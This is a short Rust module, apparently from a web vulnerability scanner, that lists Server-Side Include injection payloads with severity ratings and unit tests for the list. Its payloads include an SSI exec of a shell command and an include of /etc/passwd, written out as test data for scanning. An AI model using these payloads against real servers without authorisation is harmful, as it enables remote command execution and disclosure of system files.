use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    payload_vec!(PayloadType::Ssi,
        "basic", [
            ("<!--#exec cmd=\"id\"-->", "SSI command execution", Severity::Critical),
            ("<!--#include virtual=\"/etc/passwd\"-->", "SSI file inclusion", Severity::Critical),
            ("<!--#echo var=\"DOCUMENT_ROOT\"-->", "SSI variable echo", Severity::High),
            ("<!--#config timefmt=\"%d\"-->", "SSI config manipulation", Severity::Medium),
        ]
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        assert!(!get_payloads().is_empty());
    }

    #[test]
    fn all_payloads_are_ssi_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Ssi);
        }
    }
}
